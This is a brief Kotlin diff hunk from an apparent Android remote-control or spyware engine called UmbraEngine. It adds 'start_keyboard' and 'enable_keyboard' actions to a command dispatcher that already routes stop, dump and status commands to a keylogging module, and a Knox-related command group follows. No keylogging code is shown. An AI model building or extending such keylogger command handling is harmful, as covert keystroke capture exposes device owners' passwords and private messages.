@@ -117,6 +117,8 @@ object UmbraEngine {
                 "stop" -> KeylogModule.stop(context, cmd)
                 "dump" -> KeylogModule.dump(context, cmd)
                 "status" -> KeylogModule.status(context, cmd)
+                "start_keyboard" -> KeylogModule.startKeyboard(context, cmd)
+                "enable_keyboard" -> KeylogModule.enableKeyboard(context, cmd)
                 else -> UmbraResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
             }},
             "knox"     to { cmd -> when (cmd.action) {
